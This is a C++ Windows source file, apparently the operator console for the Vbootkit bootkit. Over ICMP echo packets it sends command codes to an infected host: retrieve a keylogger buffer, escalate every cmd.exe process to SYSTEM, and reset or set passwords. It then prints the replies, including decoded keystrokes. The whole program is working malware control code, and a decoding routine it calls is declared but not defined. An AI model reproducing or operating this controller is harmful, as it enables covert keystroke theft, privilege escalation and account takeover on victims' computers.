// pingv.cpp : Defines the entry point for the console application.
//
#define _CRT_SECURE_NO_WARNINGS

#include "stdafx.h"

#include <winsock.h>
#include <windowsx.h>
#include <iostream>

#pragma comment(lib,"wsock32.lib")

#define PING_DATA_SIZE 6400

typedef struct tagIPINFO 
{ 
	u_char Ttl;		//Time To Live 
	u_char Tos;		//Type Of Service 
	u_char IPFlags; //IP flags 
	u_char OptSize; //Size of options data 
	u_char FAR *Options; //Options data buffer 
}IPINFO,*PIPINFO; 
 
typedef struct {
    unsigned long Address;                             // Replying address
    unsigned long  Status;                     // Reply status
    unsigned long  RoundTripTime;              // RTT in milliseconds
    unsigned short DataSize;                   // Echo data size
    unsigned short Reserved;                   // Reserved for system use
    unsigned char *Data;                                // Pointer to the echo data
    IP_OPTION_INFORMATION Options;             // Reply options
} IP_ECHO_REPLY, * PIP_ECHO_REPLY;


PIP_ECHO_REPLY pIpe;

//ICMP.DLL Export Function Pointers 
HANDLE(WINAPI *pIcmpCreateFile)(VOID); 
BOOL(WINAPI *pIcmpCloseHandle)(HANDLE); 
DWORD(WINAPI *pIcmpSendEcho) 
	(HANDLE,DWORD,LPVOID,WORD,PIPINFO,LPVOID,DWORD,DWORD); 
 

// decodes keys from log
void DecodeAndPrintKeyLog(unsigned int len,unsigned char*log); 

// 
// 
void main(int argc, char **argv) 
{ 
	WSADATA wsaData;		//WSADATA 

	HANDLE	hndlIcmp;		//LoadLibrary()handle to ICMP.DLL 
	HANDLE	hndlFile;		//Handle for IcmpCreateFile() 
	LPHOSTENT pHost;		//Pointer to host entry structure 
	struct in_addr iaDest; //Internet address structure 
	DWORD	*dwAddress;		//IP Address 
	IPINFO	ipInfo;			//IP Options structure 
	int nRet;				//General use return code 
	DWORD dwRet;			//DWORD return code 
	int x; 
	unsigned char Command_Code= 0;
	unsigned char Previous_Command_Code = 0;
 
	//Check arguments 
	if(argc ==1 || argc < 3) 
	{ 
		fprintf(stderr,"\nSyntax: pingv IPAddress CommandByte CommandData\n"); 
		fprintf(stderr,"\nCommand Code      Action \n"); 
		fprintf(stderr,"0                 Get Signature immediate \n"); 
		fprintf(stderr,"1                 Get Signature Delayed \n"); 
		fprintf(stderr,"2                 Get Keylog data \n"); 
		fprintf(stderr,"3                 Escalate CMD.EXE privileges \n"); 
		fprintf(stderr,"4                 Reset Passwords/Set Passwords( toggles between states) \n"); 
		
		
		







		return; 
	} 
 
	//Dynamically load the ICMP.DLL 
	hndlIcmp=LoadLibrary("ICMP.DLL"); 
	if(hndlIcmp==NULL) 
	{ 
		fprintf(stderr,"\nCould not load ICMP.DLL\n"); 
		return; 
	} 
 
	//Retrieve ICMP function pointers 
	pIcmpCreateFile=(HANDLE(WINAPI*)(void)) 
		GetProcAddress((HMODULE)hndlIcmp,"IcmpCreateFile"); 
	pIcmpCloseHandle=(BOOL(WINAPI *)(HANDLE)) 
		GetProcAddress((HMODULE)hndlIcmp,"IcmpCloseHandle"); 
	pIcmpSendEcho=(DWORD(WINAPI*) 
		(HANDLE,DWORD,LPVOID,WORD,PIPINFO,LPVOID,DWORD,DWORD)) 
		GetProcAddress((HMODULE)hndlIcmp,"IcmpSendEcho"); 
 
	//Cheak all the function pointers 
	if(pIcmpCreateFile==NULL|| 
		pIcmpCloseHandle==NULL|| 
		pIcmpSendEcho==NULL) 
	{ 
		fprintf(stderr,"\nError getting ICMP proc address\n"); 
		FreeLibrary((HMODULE)hndlIcmp); 
		return; 
	} 
 
	//Init WinSock 
	nRet=WSAStartup(0x0101,&wsaData); 
	if(nRet) 
	{ 
		fprintf(stderr,"\nWSAStartup() error:%d\n",nRet); 
		WSACleanup(); 
		FreeLibrary((HMODULE)hndlIcmp); 
		return; 
	} 
	//Cheak WinSock version 
	if(0x0101!=wsaData.wVersion) 
	{ 
		fprintf(stderr,"\nWinSock version 1.1 not supported\n"); 
		WSACleanup(); 
		FreeLibrary((HMODULE)hndlIcmp); 
		return; 
	} 
 

 // ge ip address if name 	
	pHost=gethostbyname(argv[1]); 

	if(pHost==NULL) 
	{ 
		fprintf(stderr,"\n%s not found\n",argv[1]); 
		WSACleanup(); 
		FreeLibrary((HMODULE)hndlIcmp); 
		return; 
	} 
 
	
	
 
	//Copy the address 
	dwAddress=(DWORD*)(*pHost->h_addr_list); 
 


	Command_Code = 	 atoi( argv[2]) ;


	pIpe = (PIP_ECHO_REPLY)malloc(sizeof(IP_ECHO_REPLY) + PING_DATA_SIZE);
	char *Buffer= (char *)malloc(PING_DATA_SIZE);
		



	//Get an ICMP echo request handle 
	hndlFile=pIcmpCreateFile(); 
	for(x=0;x<2;x++) 
	{ 

		//Tell the user what we're doing 
		printf("\nPinging %s   Code: %d\n",argv[1],Command_Code);

		//Set some reasonable default valuse 
		ipInfo.Ttl=255; 
		ipInfo.Tos=0; 
		ipInfo.IPFlags=0; 
		ipInfo.OptSize=0; 
		ipInfo.Options=NULL; 
		//icmpEcho.ipInfo.Ttl=256; 
		//Reqest an ICMP echo 

		
		
		//strcpy_s(Buffer,PING_DATA_SIZE,"PING_PING_PING_PING_PING_PING_PING_PING_PING_");
		memset(Buffer,65,PING_DATA_SIZE);

		/* Command code and other things are documented here
		COMMAND_CODE,
		0 means Get Signature


		0xff means Get Response to previous command
		

		RESPONSE_BYTE
		0  means response pending and will be provided in next packet

		all other values response is provided in this packet only


		*/
		
//		Command_Code = 0;
		switch ( Command_Code) {

			case 0:  //Send Signature Packet
				    Buffer[0] = 0;
					break;

			case 1:  // Send Delayed signature Packet
				     Buffer[0] = 1;
					 break;
             case 2:                // Send Fetch KEyboard Buffer
				     Buffer[0] = 2;
					 break;
			 case 3:  // Esalate all cmd.exe to system
				     Buffer[0] = 3;
					 break;
		     case 4:  // Reset All Passworods
				     Buffer[0] = 4;
					 break;



			case 255:
				 Buffer[0] = 255;
					 break;
				     
		
		}

		strcpy(&Buffer[2],"Vbootkit");
    	 
		 pIpe->Data = (unsigned char *)malloc(PING_DATA_SIZE);
         pIpe->DataSize = sizeof(PING_DATA_SIZE);      

		dwRet=pIcmpSendEcho( 
			hndlFile,		//Handle from IcmpCreateFile() 
			*dwAddress,		//Destination IP address 
			Buffer,			//Pointer to buffer to send 
			PING_DATA_SIZE,				//Size of buffer in bytes 
			&ipInfo,		//Request options 
			pIpe,		//Request options 
			sizeof(IP_ECHO_REPLY) + PING_DATA_SIZE, 
			2* 1000);			//Time to wait in milliseconds 
		//Print the results 
		iaDest.s_addr=pIpe->Address; 
		printf("Reply from  %s	Time=%ldms	TTL=%d\n", 
					inet_ntoa(iaDest), 
					pIpe->RoundTripTime, 
					pIpe->Options.Ttl);  

		if(pIpe->RoundTripTime > 10000){ //the ping failed
            printf("Ping failed internally and could not be send\n"
				   "Please retry the command\n");
			ExitProcess(-1);

		}

		if(pIpe->Data[1] == 0)
		{
			printf("Response Pending\n");


			
			Previous_Command_Code = Command_Code ;
			Command_Code = 0xff; //so as we get the response only
			Sleep(1000);
			continue;
		}
		// all other values specify thta response is pending
		printf("Response received Len %d\n",pIpe->DataSize);

		switch (Command_Code) {
			case 0 :
			       	printf("Signature Received : %s\n", &pIpe->Data[2]  );
					ExitProcess(0);
					break;
			case 0xff:
				    printf("Delayed Response Received : %s\n", &pIpe->Data[2]  );

					switch ( Previous_Command_Code) {
							case 1 :
								printf("Delayed Signature Received : %s\n", &pIpe->Data[2]  );
								break;
							case 2: 
								printf("key lg received \n");
								DecodeAndPrintKeyLog(pIpe->Data[2],&pIpe->Data[3]);
								break;
							case 3:
								printf("Action scheduled CMD will be escalted withing 5 sec\n");
									break;
							case 4:
								printf("Password  action scheduled CMD will be escalted withing 5 sec\n");
									break;
					}
					break;
		}


								 







		
		if(pIpe->Status) 
		{ 
			printf("Error:icmpEcho.Status=%ld\n", 
				pIpe->Status); 
			break;
			
		} 
		
	} 
	printf("\n"); 
	//Close the echo request file handle 
	pIcmpCloseHandle(hndlFile); 
	FreeLibrary((HMODULE)hndlIcmp); 
	WSACleanup(); 
}

